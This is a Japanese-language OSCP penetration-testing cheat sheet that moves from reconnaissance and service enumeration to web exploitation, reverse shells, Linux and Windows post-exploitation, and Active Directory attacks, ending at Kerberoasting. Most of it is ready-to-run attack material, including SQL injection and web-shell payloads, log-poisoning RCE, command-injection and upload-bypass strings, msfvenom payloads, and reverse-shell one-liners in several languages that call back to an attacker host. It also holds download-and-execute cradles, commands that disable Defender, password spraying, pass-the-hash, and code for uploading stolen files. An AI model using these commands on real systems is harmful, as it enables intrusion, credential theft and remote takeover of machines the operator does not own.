# OSCP / ペンテスト チートシート

> 文体: 簡潔技術メモ調 / 重複排除 / 変数統一済み

---

## 0. 変数規約

| 変数 | 意味 | 例 |
|------|------|---|
| `$ip` | ターゲットIP | `10.10.10.5` |
| `$lhost` | 攻撃者IP (Kali / VPN tun0) | `10.10.14.3` |
| `$lport` | リスナーポート | `4444` |
| `$dc` | ドメインコントローラIP | `10.10.10.10` |
| `$domain` | ドメイン名 | `corp.local` |
| `<USER>` | ユーザ名 | `svc_sql` |
| `<PASS>` | パスワード | — |
| `<NTHASH>` | NTLMハッシュ (32hex) | — |
| `<SHARE>` | SMB共有名 | `IPC$` |
| `<CA>` / `<TEMPLATE>` | ADCS CA / テンプレ名 | — |
| `users.txt` / `passwords.txt` | ワードリスト | — |
| `<output>.<ext>` | 任意の出力ファイル | `scan.xml` |

```bash
# セッション変数の事前設定例
export ip=10.10.10.5
export lhost=$(ip -4 addr show tun0 | grep -oP '(?<=inet )[\d.]+')
export lport=4444
export domain=corp.local
export dc=10.10.10.10
```

---

## 1. 環境準備

### 1.1 ポート規約・サービス起動

| ポート | 用途 | 起動コマンド |
|------|------|------|
| 8001 | Python HTTPサーバ (ファイル共有) | `python3 -m http.server 8001` |
| 8089 | Python uploadserver (受信) | `~/.local/bin/uploadserver -d /tmp/inbox 8089` |
| 8884 | BloodHound CE | `cd ~/tools/windows/bloodhound && sudo docker compose up -d` |
| 11601 | ligolo-ng proxy | `sudo /tools/ligolo-ng/proxy -laddr 0.0.0.0:11601 -selfcert -v` |
| 9000 | chisel server | `./chisel server --port 9000 --reverse` |
| 4444 | リバースシェルリスナー | `rlwrap -cAr nc -lvnp 4444` |

### 1.2 /etc/hosts・VPN

```bash
# VPN接続後にtun0からIPを自動取得
export lhost=$(ip -4 addr show tun0 | awk '/inet/{print $2}' | cut -d/ -f1)

# /etc/hosts追記
echo "$ip $domain dc01.$domain" | sudo tee -a /etc/hosts
```

---

## 2. 情報収集 (Recon)

### 2.1 Rustscan ★メイン (高速ポート発見)

```bash
# 全ポート + サービス検出
rustscan -a $ip --ulimit 5000 -- -A -sV
# 全ポート (Nmapに渡さない)
rustscan -a $ip -r 1-65535 --ulimit 5000
```

### 2.2 Nmap (詳細スキャン)

```bash
# クイック (TCP top 1000 + script + version)
grc nmap -sV -sT -sC $ip

# 全ポート + 詳細 (トンネル経由はT3推奨)
grc nmap -p- -sC -sV -T4 -A -Pn $ip

# 結果保存 (-oX でXML)
grc nmap -p- -sCV -T4 -A -Pn $ip -oX ~/work/scans/$ip.xml

# 脆弱性スクリプト
sudo grc nmap -p- -sS -sC -sV --script vuln -O -T4 -Pn $ip

# UDP top 50
sudo nmap -sU --top-ports=50 -Pn $ip
```

---

## 3. サービス別列挙

### 3.1 Web (HTTP/HTTPS)

#### Feroxbuster ★メイン

```bash
# 初手 (common.txt + 拡張子)
feroxbuster -u http://$ip \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
  -t 50 -r --timeout 3 --no-state \
  -s 200,301,302,401,403 -x php,html,txt \
  --dont-scan '/(css|fonts?|images?|img)/'

# CGI-binチェック
feroxbuster -u http://$ip \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/LEGACY-SERVICES/CGIs/CGIs.txt \
  -t 100 -r --timeout 3 --no-state -s 200,301 -e -E

# 二番手 (raft-small)
feroxbuster -u http://$ip \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt \
  -t 50 -r --timeout 3 --no-state -s 200,301,302,401,403 -x php,html,txt

# 重スキャン (directory-list-2.3-big)
feroxbuster -u http://$ip \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt \
  -t 50 -r --timeout 3 --no-state -s 200,301,302,401,403 \
  -x php,html,js,txt -e -E --scan-dir-listings

# Basic認証付き
feroxbuster -u http://<USER>:<PASS>@$ip:8715 \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
  -t 50 -r -s 200,301,302,401,403 -x php,html,txt
```

#### dirsearch (代替)

```bash
# 標準
dirsearch -u http://$ip -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
  -e php,html,js -t 40 --random-agent

# 三階層深堀
dirsearch -u http://$ip \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -e php,html,js -r --deep-recursive -R 3 \
  --recursion-status=200-399,401,403 -t 60 --random-agent

# 複数サブディレクトリ
dirsearch -u http://$ip --subdirs=/,/admin,/api,/backup \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
  -e php,html,js -t 50 --random-agent
```

#### ffuf / wfuzz

```bash
# ディレクトリ列挙
ffuf -u http://$ip/FUZZ -ic -c -ac -mc 200,301,302,403 \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

# 拡張子付き
ffuf -u http://$ip/FUZZ -e .php,.html,.txt,.bak,.zip,.old,.log,.conf,.xml,.json \
  -ic -c -ac -mc 200,301,302,403 -t 50 \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

# 再帰
ffuf -u http://$ip/FUZZ -e .php,.html,.txt,.bak \
  -recursion -recursion-depth 3 -recursion-strategy greedy \
  -ic -c -ac -mc 200,301,302 -t 40 \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

# vHost / サブドメイン
ffuf -H "Host: FUZZ.$domain" -u http://$ip -mc 200,301,302,403 -ac -ic -c -t 50 \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
ffuf -u http://FUZZ.$domain -mc 200,301 -ac -ic -c -t 50 \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt

# wfuzz vHost (--hh でベースラインChars除外)
wfuzz -u http://$domain/ -H "Host: FUZZ.$domain" --hh <baseline_chars> \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt

# パラメータFuzz (LFI)
ffuf -u "http://$ip/index.php?file=FUZZ" -ic -c -ac -mc 200 -t 50 \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
```

#### Nuclei / Whatweb / Nikto / CeWL

```bash
# Nuclei (テンプレート更新後)
nuclei -update-templates
nuclei -u http://$ip -as -stats
nuclei -u http://$ip -tags tech,cms,cve -severity low,medium,high,critical
nuclei -u http://$ip -tags wordpress

# Whatweb (技術スタック)
whatweb -v -a 4 --colour=always --log-json=$ip-whatweb.json http://$ip

# Nikto
nikto -h $ip -Tuning x

# CeWL (ワードリスト生成 / 試験頻出)
cewl http://$ip -d 4 -m 5 --with-numbers -w wordlist.txt
cewl http://$ip -d 2 -m 5 -e --email_file emails.txt -w wordlist.txt

# Curl
curl -s http://$ip/wp-json/wp/v2/users/                # WordPressユーザ列挙
curl -F file=@payload.txt http://$ip/file-upload       # ファイルアップロード
curl -F filename="/tmp/x.txt" -F file=@payload.txt http://$ip/file-upload
```

---

### 3.2 SMB (139 / 445)

#### 列挙 ★メイン: nxc (NetExec)

```bash
# バナー / ホスト情報
nxc smb $ip

# 共有一覧
nxc smb $ip -u 'guest' -p '' --shares
nxc smb $ip -u <USER> -p <PASS> --shares
nxc smb $ip -u <USER> -H <NTHASH> --shares      # PtH

# RIDブルート (匿名ユーザ列挙) ★重要
nxc smb $ip -u 'guest' -p '' --rid-brute

# ユーザ / パスポリシー
nxc smb $ip -u <USER> -p <PASS> --users
nxc smb $ip -u <USER> -p <PASS> --pass-pol

# Spider (ファイル探索)
nxc smb $ip -u <USER> -p <PASS> --spider <SHARE> --depth 5 --only-files
```

#### 列挙 (代替ツール)

```bash
# enum4linux-ng (詳細)
enum4linux-ng -A $ip

# smbmap
smbmap -H $ip -u 'guest' -p ''
smbmap -H $ip -d $domain -u <USER> -p '<PASS>'

# nmap SMBスクリプト
nmap -p139,445 --script smb-enum* -Pn -n $ip

# RPC (匿名ユーザ列挙)
rpcclient -U '' -N $ip -c 'enumdomusers; enumdomgroups; getdompwinfo'
rpcclient -U '' -N $ip -c 'querydispinfo'
# インタラクティブ: enumdomusers / enumdomgroups / queryuser 0x1f4 / querygroupmem 0x200
```

#### ファイル操作: smbclient

```bash
# 共有一覧 (匿名 / 認証)
smbclient -L //$ip -N
smbclient -L //$ip -U '<USER>%<PASS>' -m SMB3

# 共有接続
smbclient //$ip/<SHARE> -N -m SMB3                              # 匿名
smbclient //$ip/<SHARE> -U '<USER>%<PASS>' -m SMB3              # 認証
smbclient //$ip/<SHARE> -U "$domain/<USER>%<PASS>" -m SMB3      # ドメイン
smbclient //$ip/<SHARE> -U "$domain/<USER>%<NTHASH>" --pw-nt-hash -m SMB3   # PtH

# 非インタラクティブ (一括ダウンロード)
smbclient //$ip/<SHARE> -N -c "prompt OFF; recurse ON; mget *" -m SMB3

# 大容量ファイル (ntds.dit等)
smbget -U "$domain/<USER>%<PASS>" \
  "smb://$ip/<SHARE>/Active Directory/ntds.dit" -o ~/work/ntds.dit

# FTP一括
wget -m --no-passive-ftp ftp://anonymous:anonymous@$ip/

# smbclient対話内コマンド
# ls / recurse ON / prompt OFF / mget * / get <file> / put <local>
```

#### EternalBlue (MS17-010)

```bash
nmap -p445 --script smb-vuln-ms17-010 $ip
nmap -p139,445 --script smb-vuln* $ip
```

---

### 3.3 LDAP (389 / 636)

```bash
# 匿名バインド
ldapsearch -x -H ldap://$ip -b "dc=$domain"

# ユーザ一覧抽出
ldapsearch -x -H ldap://$ip -b "DC=corp,DC=local" \
  "(&(objectclass=user)(objectCategory=person))" sAMAccountName \
  | awk '/sAMAccountName:/{print $2}' | tee users.txt

# LAPSパスワード取得
ldapsearch -x -H ldap://$ip -D "<USER>@$domain" -w '<PASS>' \
  -b "DC=corp,DC=local" "(objectclass=computer)" ms-Mcs-AdmPwd

# 一括ドメインダンプ
ldapdomaindump ldap://$ip
ldapdomaindump ldap://$ip -u "$domain\\<USER>" -p '<PASS>'
```

---

### 3.4 Kerberos (88) — 列挙のみ

> 攻撃 (Roasting) は §8 ADを参照

```bash
# ユーザ列挙 (kerbrute)
/tools/windows/kerbrute/kerbrute userenum --dc $ip -d $domain \
  /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
# Windows対象は svc-users.txt も併用
/tools/windows/kerbrute/kerbrute userenum -d $domain --dc $ip users.txt

# パスワードスプレー
/tools/windows/kerbrute/kerbrute passwordspray -d $domain users.txt '<PASS>' --dc $ip
```

---

### 3.5 MSSQL (1433)

```bash
# 接続
impacket-mssqlclient <USER>:<PASS>@$ip                    # SQL認証
impacket-mssqlclient <USER>:<PASS>@$ip -windows-auth      # Windows認証
impacket-mssqlclient sa@$ip -windows-auth
impacket-mssqlclient -k -no-pass $ip                      # Kerberos

# Silver Ticket経由
export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient -k $domain -no-pass -target-ip $ip -port 1433

# nxc ブルート
nxc mssql $ip -u 'admin' -p 'admin' --local-auth
nxc mssql $ip -u '' -p '' --local-auth

# sqlmap (基本)
sqlmap -u "http://$ip/blindsqli.php?user=1" -p user
```

---

### 3.6 MySQL (3306)

```bash
# 接続
mysql -h $ip -u <USER> -p --skip-ssl
mysql -h $ip --port=3306 --user=root --password=<PASS> --skip-ssl

# Windows
.\mysql.exe -h 127.0.0.1 -u root --skip-password -e "SHOW DATABASES;"
.\mysql.exe -h 127.0.0.1 -u root --skip-password -D <DB> -e "SELECT * FROM users;"
```

```sql
-- 基本構文
SHOW DATABASES;
USE <DB>;
SHOW TABLES;
SELECT * FROM <table>;

-- ファイル書き出し可否確認 (空文字ならOK)
SHOW VARIABLES LIKE "secure_file_priv";
```

---

### 3.7 PostgreSQL (5432)

```bash
psql -h $ip -p 5432 -U postgres
```

```sql
\l                    -- DB一覧
\du                   -- ロール一覧
SELECT current_user;

-- ファイル読取
SELECT pg_read_file('/etc/passwd');

-- コマンド実行
COPY cmd_output FROM PROGRAM 'id';
```

---

### 3.8 SMTP (25) / DNS (53) / SNMP (161)

```bash
# SMTP ユーザ列挙
smtp-user-enum -M RCPT \
  -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  -t $ip -p 25
nc -vn $ip 25
echo -e "EHLO test\r\nQUIT" | nc $ip 25

# DNS
dnsenum $domain
amass enum -d $domain
# サーバ特定 (IP逆引き)
nslookup web02.dmz.$domain dc01.$domain

# SNMP
snmpwalk -v 2c -c public $ip
snmpwalk -v 1 -c public $ip NET-SNMP-EXTEND-MIB::nsExtendObjects
```

---

### 3.9 RDP / WinRM — 接続

```bash
# xfreerdp (クリップボード + ドライブ共有)
xfreerdp +clipboard /drive:share,/home/n0z0/share \
  /cache:bitmap:on /network:auto +dynamic-resolution +gfx \
  /compression-level:2 /v:$ip /u:<USER> /p:<PASS>

# マルチモニタ + スマートリサイズ
xfreerdp /sec:tls /multimon /monitors:0,1 \
  /smart-sizing:2560x1080 /scale:140 \
  +async-input +async-channels /dynamic-resolution \
  /v:$ip /u:<USER> /p:<PASS>

# evil-winrm (PSRemote)
evil-winrm -i $ip -u <USER> -p <PASS>
evil-winrm -i $ip -u <USER> -H <NTHASH>          # PtH
# 内部コマンド: upload <local> / download <remote>

# nxc 経由のRDP / WinRM試行
nxc rdp   $ip/24 -u <USER> -p '<PASS>' --continue-on-success --local-auth
nxc winrm $ip/24 -u <USER> -H <NTHASH> --continue-on-success --local-auth

# RDPリモート有効化 (smb経由)
nxc smb $ip -u <USER> -p <PASS> -M rdp -o ACTION=enable
```

---

### 3.10 ADイントロ列挙 (BloodHound等)

```bash
# データ収集 (Linuxから)
bloodhound-python -u <USER> -p <PASS> -d $domain -ns $ip -c all --zip

# Windows上 (SharpHound)
.\SharpHound.exe -c All --zipfilename output.zip

# BloodHound CE 起動
cd ~/tools/windows/bloodhound && sudo docker compose up -d
# http://localhost:8884 (admin / 12345)
```

#### BloodHound 試験フロー

1. `bloodhound-python -c all` でzip収集
2. CEにimport → 初期アクセスユーザを **Owned** マーク
3. Pathfinding: Owned → Domain Admins
4. パスなし → Owned → Remote Management Users / WinRMグループ
5. パスなし → Outbound Object Control でACE手動確認
6. GenericAll / WriteDacl エッジ追跡
7. グループ入れ子関係に注目 (developers → Remote Management Users 等)
8. BHで見えない攻撃 (Silver Ticket / MSSQL OPENROWSET) は手動列挙

#### よく使うCypher

```cypher
// Kerberoast対象
MATCH (u:User {hasspn:true}) RETURN u

// Remote Management Users 経由パス
// Start: 取得済ユーザ / End: DOMAIN ADMINS
```

> 参考: https://queries.specterops.io/?input=Generic+all

---

## 4. Web脆弱性

### 4.1 SQL Injection

```sql
-- 認証バイパス
' OR 1=1-- -

-- Union-based
' UNION SELECT null, null, null-- -
' UNION SELECT 1,2,database()-- -
' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,username,password FROM users-- -

-- Boolean Blind
' AND 1=1-- -                                                          -- True
' AND 1=2-- -                                                          -- False
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a'-- -

-- File Read/Write (DB権限次第)
-- MySQL
' UNION SELECT LOAD_FILE('/etc/passwd')-- -
' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY '<?php system($_GET["cmd"]); ?>'-- -
-- MSSQL
' UNION SELECT null, BulkColumn FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB)-- -
```

#### SQL→OSコマンド実行

```sql
-- MSSQL (sysadmin前提)
EXEC xp_cmdshell 'whoami';

-- PostgreSQL
COPY (SELECT '') TO PROGRAM 'id';

-- MySQL (UDF)
SELECT sys_exec('nc -e /bin/bash $lhost $lport');
```

#### MSSQL xp_cmdshell有効化フロー

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');                     -- 1ならsysadmin
SELECT SYSTEM_USER, SESSION_USER;                         -- 実行アカウント確認
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- ファイル読取 (権限次第)
SELECT BulkColumn FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\proof.txt', SINGLE_CLOB) AS x;
```

---

### 4.2 LFI / RFI

```bash
# 基本
?file=../../../../etc/passwd
?page=../../../../../../../windows/system32/drivers/etc/hosts

# Nullバイト (PHP < 5.3.4)
?file=../../../../etc/passwd%00

# フィルタバイパス
?file=....//....//....//etc/passwd
?file=..%252f..%252f..%252fetc/passwd

# PHPフィルタ (Base64でソース取得)
?file=php://filter/convert.base64-encode/resource=index.php

# RFI (allow_url_include=On)
?file=http://$lhost/shell.php
```

#### Log Poisoning → RCE

```bash
# 1. UAヘッダにPHPコード注入
curl -A "<?php system(\$_GET['cmd']); ?>" http://$ip/

# 2. LFIでログを実行
?file=/var/log/apache2/access.log&cmd=whoami
?file=/var/log/nginx/access.log&cmd=id
```

---

### 4.3 Command Injection

```bash
; whoami
| whoami
& whoami
&& whoami
`whoami`
$(whoami)

# 改行
%0A whoami
%0D whoami

# スペースバイパス
${IFS}whoami
cat</etc/passwd
{cat,/etc/passwd}
```

---

### 4.4 File Upload

```bash
# 拡張子偽装
shell.php.jpg
shell.php%00.jpg          # Nullバイト
shell.php;.jpg

# Content-Type偽装
Content-Type: image/jpeg

# Polyglot (GIF + PHP)
GIF89a;<?php system($_GET['cmd']); ?>
```

---

### 4.5 Insecure Deserialization

```python
# Python pickle
import pickle, os
class RCE:
    def __reduce__(self):
        return (os.system, ('id',))
print(pickle.dumps(RCE()))
```

```php
// PHP unserialize()
O:8:"UserData":1:{s:4:"role";s:5:"admin";}
```

---

### 4.6 SSRF / Open Redirect

```bash
# 内部スキャン
?url=http://127.0.0.1:8080/
?url=http://169.254.169.254/latest/meta-data/        # AWS metadata

# プロトコル切替
?url=file:///etc/passwd
?url=gopher://127.0.0.1:6379/_INFO

# Open Redirect → SSRF chain
?url=http://$lhost/redirect?to=http://internal/
```

---

## 5. 初期侵入 (リバースシェル)

### 5.1 リスナー

```bash
nc -lvnp $lport                          # 基本
rlwrap -cAr nc -lvnp $lport              # ↑ + Ctrl+C / ヒストリ
socat -d -d TCP-LISTEN:$lport,reuseaddr FILE:$(tty),raw,echo=0   # フルPTY
```

### 5.2 msfvenom (バイナリ生成)

```bash
# Windows x64 ★まずこれ
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f exe > shell.exe
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f exe > shell.exe

# Windows x86
msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f exe > shell.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > shell.exe
msfvenom -p windows/powershell_reverse_tcp LHOST=$lhost LPORT=$lport -f exe > shell.exe

# Linux
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f elf > shell.elf
msfvenom -p generic/shell_bind_tcp RHOST=$ip LPORT=$lport -f elf > bind.elf

# PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw > shell.php

# WAR / ASPX (Tomcat / IIS)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lhost LPORT=$lport -f war > shell.war
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f aspx > shell.aspx

# アーキテクチャ確認 (Windows)
echo %PROCESSOR_ARCHITECTURE%
```

### 5.3 ワンライナー (リバースシェル)

```bash
# Bash
bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'

# Python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("$lhost",$lport));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'

# PHP
php -r '$s=fsockopen("$lhost",$lport);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="$lhost";$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("$lhost","$lport");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

```powershell
# PowerShell ワンライナー
$client = New-Object System.Net.Sockets.TCPClient("$lhost",$lport);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}

# powercat 経由
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://$lhost:8001/powercat.ps1');powercat -c $lhost -p $lport -e cmd"
```

### 5.4 シェル安定化

```bash
# Linux (Python TTY)
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z でローカルへ戻る
stty raw -echo; fg
# 戻ったら
export TERM=xterm-256color SHELL=/bin/bash
stty rows 38 columns 116; reset

# socat 完全PTY (待ち受け側)
socat -d -d TCP-LISTEN:$lport,reuseaddr FILE:$(tty),raw,echo=0

# Windows ConPty (試験頻出)
Import-Module .\Invoke-ConPtyShell.ps1
Invoke-ConPtyShell $lhost $lport
```

---

## 6. ポストエクスプロイト (Linux)

### 6.1 列挙ツール

```bash
./linpeas.sh

# linux-exploit-suggester
./les.sh --checksec        # 高確度のみ
./les.sh --full            # sudo/SUIDも含む

# linux-smart-enumeration
./lse.sh -l 1              # 重要のみ
./lse.sh -l 2              # 詳細
```

### 6.2 SUID / sudo / cron / capabilities

```bash
# SUID
find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -type f -exec ls -l {} \; 2>/dev/null

# SGID
find / -perm -2000 -type f 2>/dev/null

# SUID + SGID
find / -xdev -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null

# 書き込み可能ディレクトリ
find / -writable -type d 2>/dev/null

# sudo 権限
sudo -l

# capabilities
getcap -r / 2>/dev/null

# cron
cat /etc/crontab
ls -la /etc/cron.* /var/spool/cron 2>/dev/null
```

### 6.3 認証情報ハント

```bash
# 再帰grep (機密ワード)
rg -n --hidden --no-ignore-vcs -S \
  '(password|passwd|pass|pwd|secret|token|api[_-]?key|auth|credential|username|user|login)\b' \
  -g'!*bb-vendor/**' -g'!*bb-library/**' -g'!*.min.*' -g'!*.map' -g'!*.lock' -g'!.git/**'

# 履歴
cat ~/.bash_history /home/*/.bash_history 2>/dev/null
cat ~/.mysql_history ~/.psql_history 2>/dev/null

# SSH鍵
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
```

### 6.4 ファイル転送

```bash
# Kali側 HTTPサーバ
python3 -m http.server 8001

# ターゲット側 (Linux)
wget http://$lhost:8001/<file>
curl -O http://$lhost:8001/<file>

# SCP (双方向)
scp <USER>@$ip:/remote/file ~/loot/
scp -r <USER>@$ip:/remote/dir ~/loot/
scp /local/file <USER>@$ip:/tmp/

# SSHポートフォワード
ssh <USER>@$ip -L 8080:127.0.0.1:8080
```

---

## 7. ポストエクスプロイト (Windows)

### 7.1 列挙ツール

```powershell
# winPEAS (PrintSpoofer経由でAVバイパス例)
.\PrintSpoofer.exe -i -c "C:\Users\<USER>\Documents\winPEASx64.exe"

# PrivescCheck
powershell -NoLogo -NoProfile -ExecutionPolicy Bypass -Command `
  ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report .\privesc.txt"

# Seatbelt / Empire など
.\Get-SPN.ps1
. .\Invoke-Kerberoast.ps1
Invoke-Kerberoast -OutputFormat Hashcat
```

### 7.2 PowerShell お作法 / Defender回避

```powershell
# 実行ポリシー回避
powershell -ep bypass
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

# Defender (要管理者)
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true

# モジュール読込
Import-Module .\PowerView.ps1
IEX (New-Object Net.WebClient).DownloadString('http://$lhost/PowerView.ps1')

# 環境 / クリーンアップ
dir env:
Remove-Item .\win_tool -Recurse -Force
```

### 7.3 ファイル転送

```cmd
:: cmd
certutil -urlcache -split -f http://$lhost:8001/win_tool.zip win_tool.zip
```

```powershell
# powershell ダウンロード
powershell -c "(New-Object Net.WebClient).DownloadFile('http://$lhost:8001/<file>','C:\Windows\Temp\<file>')"
powershell -c "Invoke-WebRequest -Uri http://$lhost:8001/<file> -OutFile C:\Windows\Temp\<file>"
wget http://$lhost:8001/<file> -OutFile <file>      # PSエイリアス
curl -O http://$lhost:8001/<file>                    # PSエイリアス

# Windows→Kali アップロード (uploadserver)
$Uri  = "http://$lhost:8089/upload"
$File = "C:\temp\loot.zip"
Add-Type -AssemblyName System.Net.Http
$hc = [System.Net.Http.HttpClient]::new()
$mp = [System.Net.Http.MultipartFormDataContent]::new()
$fs = [System.IO.File]::OpenRead($File)
$ct = [System.Net.Http.StreamContent]::new($fs)
$ct.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
$mp.Add($ct, "files", [System.IO.Path]::GetFileName($File))
$resp = $hc.PostAsync($Uri, $mp).Result
"Status: $($resp.StatusCode)"
$fs.Dispose(); $hc.Dispose()
# Kali側
~/.local/bin/uploadserver -d /tmp/inbox 8089

# 解凍
Expand-Archive -Path .\win_tool.zip -DestinationPath . -Force
tar -xf win_tool.zip

# 削除
Remove-Item .\win_tool -Recurse -Force
del /f /q "C:\Users\Public\Downloads\<file>"
```

### 7.4 Potato系 (SeImpersonate権限の昇格)

> DCOM有効性の確認: `Get-ItemProperty -Path "HKLM:\Software\Microsoft\OLE" | Select EnableDCOM`

```powershell
# PrintSpoofer
.\PrintSpoofer.exe -i -c "powershell.exe"
.\PrintSpoofer.exe -i -c "powershell -Command Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'C:\tools\nc.exe $lhost $lport -e powershell.exe'"

# GodPotato (新ウィンドウで管理者PS)
.\GodPotato.exe -cmd "C:\tools\PsExec64.exe -accepteula -i -s powershell.exe"
.\GodPotato.exe -cmd ".\nc.exe $lhost $lport -e cmd.exe"

# SharpEfsPotato (msfvenomシェル併用)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o shell.exe
.\SharpEfsPotato.exe -p "C:\Users\<USER>\Downloads\shell.exe"
```

> 参考: https://lolbas-project.github.io / https://jlajara.gitlab.io/Potatoes_Windows_Privesc

### 7.5 RDP有効化 / ユーザ追加

```cmd
:: パスワード再設定
net user Administrator <PASS>

:: RDP有効化
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="Remote Desktop" new enable=Yes

:: RDPグループ追加
net localgroup "Remote Desktop Users" Administrator /add
net localgroup "Remote Desktop Users" "<DOMAIN>\<USER>" /add
```

```powershell
Add-LocalGroupMember -Group "Remote Desktop Users" -Member "<DOMAIN>\<USER>"
```

### 7.6 ドメイン / AD列挙 (Windows on-host)

```powershell
# 現在ドメイン
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# net コマンド
net user /domain
net user <USER> /domain
net group /domain
net group "Domain Admins" /domain
net accounts /domain
runas /user:$domain\<USER> "cmd.exe /k whoami"

# ActiveDirectory モジュール
Get-ADUser -Identity <USER> -Server $domain -Properties *
Get-ADUser -Filter 'Name -like "*<keyword>"' -Server $domain | Format-Table Name,SamAccountName -A
Get-ADGroup -Identity <GROUP> -Server $domain
Get-ADGroupMember -Identity <GROUP> -Server $domain
Get-ADDomain -Server $domain

# パスワード強制リセット
Set-ADAccountPassword -Identity <USER> -Server $domain `
  -OldPassword (ConvertTo-SecureString -AsPlaintext "<old>" -force) `
  -NewPassword (ConvertTo-SecureString -AsPlainText "<new>" -Force)
```

### 7.7 Windows サーバ化 (Win→Win 中継)

```powershell
# サーバ側 (HttpListenerでカレントを公開)
$port=8011;$root=(Get-Location).Path;$lis=[System.Net.HttpListener]::new();$lis.Prefixes.Add("http://*:$port/");$lis.Start();while($lis.IsListening){try{$ctx=$lis.GetContext();$path=[Uri]::UnescapeDataString($ctx.Request.Url.AbsolutePath.TrimStart('/'));$file=Join-Path $root $path;if(!$path){$html='<ul>'+(Get-ChildItem $root|%{'<li><a href="'+$_.Name+'">'+$_.Name+'</a></li>'})+'</ul>';$bytes=[Text.Encoding]::UTF8.GetBytes($html);$ctx.Response.ContentType='text/html'}elseif(Test-Path $file){$bytes=[IO.File]::ReadAllBytes($file);$ctx.Response.ContentType='application/octet-stream'}else{$ctx.Response.StatusCode=404;$bytes=@()};$ctx.Response.ContentLength64=$bytes.Length;$ctx.Response.OutputStream.Write($bytes,0,$bytes.Length);$ctx.Response.OutputStream.Close()}catch{Write-Warning $_.Exception.Message}}

# クライアント側
Invoke-WebRequest http://<server_ip>:8011/<file> -OutFile <file>
```

---

## 8. AD攻撃 (横展開・権限昇格)

### 8.1 Kerberoasting (SPN持ちアカウントのTGS取得)

```bash
# Linux (impacket)
impacket-GetUserSPNs -dc-ip $dc $domain/<USER>:<PASS> -request
impacket-GetUserSPNs -dc-ip $dc $domain/<USER> -request -hashes :<NTHASH>   # PtH
```

```powershell
# Windows (Rubeus)
.\Rubeus.exe kerberoast
. .\Invoke-Kerberoast.ps1; Invoke-Kerberoast -OutputFormat Hashcat
```

